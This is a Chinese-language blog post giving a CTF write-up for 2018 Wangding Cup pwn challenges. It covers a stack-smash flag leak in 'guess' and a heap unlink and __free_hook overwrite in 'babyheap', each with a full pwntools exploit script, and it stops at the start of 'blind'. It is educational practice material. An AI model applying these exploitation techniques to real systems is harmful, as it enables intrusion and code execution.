<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Sivona">





<title>2018网鼎杯pwn | Hexo</title>



    <link rel="icon" href="/ida.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    




<meta name="generator" content="Hexo 4.2.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Sivona&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Sivona&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">2018网鼎杯pwn</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Sivona</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">April 22, 2020&nbsp;&nbsp;17:34:45</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/writeup/">writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <blockquote>
<p>因为下个月要参加网鼎杯，看一下上一届的题</p>
</blockquote>
<h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;cpp</span><br><span class="line">  HIDWORD(stat_loc.__iptr) &#x3D; open(&quot;.&#x2F;flag.txt&quot;, 0, a2);</span><br><span class="line">  if ( HIDWORD(stat_loc.__iptr) &#x3D;&#x3D; -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;.&#x2F;flag.txt&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, 0x30uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br></pre></td></tr></table></figure>

<p>这题开启了canary，并且将flag.txt的内容读到了栈中，让人不禁想到stack smash （想了好久。。<br>一开始没想明白程序是怎么执行的，几乎没做过开发，第一次见到fork()这个函数，上网看了一下前辈的博客。<br>fork()会创建一个子进程，并且在进程表中为他建立一个新的表项，复制父进程的几乎所有信息，只有fork()的返回值不同，子进程返回0，父进程返回子进程的pid。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )<span class="comment">//控制fork次数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )<span class="comment">//子进程在此处跳出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc); <span class="comment">//父进程在此处堵塞等待子进程exit</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进一下___stack_chk_fail函数  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/sivona/glibc<span class="number">-2.23</span>/debug/stack_chk_fail.c</span><br><span class="line">   <span class="number">22</span> <span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line">   <span class="number">23</span> </span><br><span class="line">   <span class="number">24</span> <span class="keyword">void</span></span><br><span class="line">   <span class="number">25</span> __attribute__ ((noreturn))</span><br><span class="line">   <span class="number">26</span> __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line"> ► <span class="number">27</span> &#123;</span><br><span class="line">   <span class="number">28</span>   __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">   <span class="number">29</span> &#125;</span><br><span class="line">───────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/sivona/glibc<span class="number">-2.23</span>/debug/fortify_fail.c</span><br><span class="line">   <span class="number">32</span>     do_abort = <span class="number">1</span>;</span><br><span class="line">   <span class="number">33</span>   <span class="keyword">else</span></span><br><span class="line">   <span class="number">34</span>     do_abort = <span class="number">2</span>;</span><br><span class="line">   <span class="number">35</span>   <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">   <span class="number">36</span>   <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> ► <span class="number">37</span>     __libc_message (do_abort, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">   <span class="number">38</span> 		    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">   <span class="number">39</span> &#125;</span><br><span class="line">   <span class="number">40</span> libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>

<p>计算一下__libc_argv和我们输入的内容的偏移就可以打印flag，当然因为aslr还需要泄露libc和栈地址，同样利用stack smash 泄露_environ地址，计算flag偏移。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#io = process("./GUESS", env = &#123;"LD_PRELOAD": "./libc.so.6"&#125;)</span></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29959</span>)</span><br><span class="line">elf = ELF(<span class="string">"./GUESS"</span>)</span><br><span class="line"><span class="comment">#  libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io, "b *0x400B23\n")</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"flag\n"</span>, <span class="string">'a'</span> * <span class="number">0x128</span> + p64(elf.got[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>: ].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">info(<span class="string">"libc:"</span>+hex(libc.address))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"flag\n"</span>, <span class="string">'a'</span> * <span class="number">0x128</span> + p64(libc.sym[<span class="string">'_environ'</span>]))</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>: ].ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info(<span class="string">"stack:"</span>+hex(stack))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"flag\n"</span>, <span class="string">'a'</span> * <span class="number">0x128</span> + p64(stack - <span class="number">0x168</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><blockquote>
<p>众所周知babyheap都是骗人的</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>程序开启了Full RELRO我们不能修改got表，PIE关闭使得我们有机会在bss段写东西</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; !ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr[v1] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content:"</span>, &amp;s);</span><br><span class="line">    readcontent((__int64)ptr[v1], <span class="number">0x20</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x1F</span> &amp;&amp; ptr[v1] &amp;&amp; dword_6020B0 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content:"</span>, &amp;s);</span><br><span class="line">    readcontent((__int64)ptr[v1], <span class="number">0x20</span>u);</span><br><span class="line">    ++dword_6020B0;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]);                              <span class="comment">// uaf</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>程序只能分配10次0x30大小的chunk，edit也只能修改3次且限制长度0x20，在free后未将指针置零，存在uaf double free</p>
<p>思路是通过unlink修改bss段指针达到任意地址读写的目的</p>
<p>但是我们只能分配fastbin，所以通过double free泄露堆地址并且在堆中<strong>构造fake unlink的环境</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x986000</span><br><span class="line">0x986000:	0x0000000000000000	0x0000000000000031---chunk1</span><br><span class="line">0x986010:	0x0000000000000000	0x0000000000000021---fake chunk</span><br><span class="line">0x986020:	0x0000000000602088	0x0000000000602090---通过double free在此处分配chunk来修改chunk2的头</span><br><span class="line">0x986030:	0x0000000000000020	0x0000000000000090---chunk2</span><br><span class="line">0x986040:	0x0000000000980000	0x0000000000000000</span><br><span class="line">0x986050:	0x0000000000000040	0x0000000000000090</span><br><span class="line">0x986060:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x986070:	0x0000000000000033	0x0000000000000000</span><br><span class="line">0x986080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x986090:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x9860a0:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x9860b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9860c0:	0x0000000000000000	0x0000000000020f41</span><br><span class="line">pwndbg&gt; x&#x2F;12gx 0x602060</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000986010</span><br><span class="line">0x602070:	0x0000000000986040	0x0000000000986070</span><br><span class="line">0x602080:	0x00000000009860a0	0x0000000000986030</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000986040</span><br><span class="line">0x6020a0:	0x0000000000986010	0x0000000000986040</span><br><span class="line">0x6020b0:	0x0000000000000001	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>unlink成功后就可以任意地址读写了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;12gx 0x602060</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000986010</span><br><span class="line">0x602070:	0x0000000000986040	0x0000000000986070</span><br><span class="line">0x602080:	0x00000000009860a0	0x0000000000986030</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000986040</span><br><span class="line">0x6020a0:	0x0000000000602088	0x0000000000986040</span><br><span class="line">0x6020b0:	0x0000000000000001	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>我采取的方式是通过show puts@got来leak libc 注意修改edit的三次限制</p>
<p>还有一种leak思路是<strong>构造fake unsortedbin</strong> 但还是要unlink</p>
<p>然后修改<strong>free_hook拿到shell，</strong>malloc_hook不太行</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p = process('./babyheap',env = &#123;"LD_PRELOAD": "./libc.so.6"&#125;)</span></span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">1</span>,<span class="string">'1'</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="string">'2'</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="string">'3'</span>)</span><br><span class="line">new(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#top</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#2---1---2</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\nDone!\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">info(<span class="string">'#leak:'</span>+hex(leak))</span><br><span class="line">heap=leak<span class="number">-0x30</span></span><br><span class="line">new(<span class="number">7</span>,p64(heap+<span class="number">0x20</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x40</span>)+p32(<span class="number">0x90</span>))<span class="comment">#2222</span></span><br><span class="line">new(<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p32(<span class="number">0x31</span>))<span class="comment">#1111 bypass fastbin check</span></span><br><span class="line">new(<span class="number">9</span>,<span class="string">'2'</span>)</span><br><span class="line">new(<span class="number">5</span>,p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">edit(<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(bss+<span class="number">0x8</span>*<span class="number">8</span><span class="number">-0x18</span>)+p32(bss+<span class="number">0x8</span>*<span class="number">8</span><span class="number">-0x10</span>))<span class="comment">#bypass unlink check</span></span><br><span class="line">g()</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(<span class="number">0x6020b0</span>)+p64(elf.got[<span class="string">'puts'</span>]))<span class="comment">#edit on 5 6</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#fuck edit</span></span><br><span class="line">show(<span class="number">6</span>)<span class="comment">#show puts@got</span></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">'\nDone!'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">"#libc_base:"</span>+hex(libc_base))</span><br><span class="line">edit(<span class="number">8</span>,p64(libc_base+libc.sym[<span class="string">'__free_hook'</span>]))<span class="comment">#edit on 5</span></span><br><span class="line"><span class="comment">#edit(8,p64(libc_base+libc.sym['__malloc_hook'])+p64(libc_base+libc.sym['__realloc_hook']))#edit on 5 6 wanna atack realloc_hook</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xf1147</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>同样开启了full relro无法修改GOT表，没有开启PIE</p>
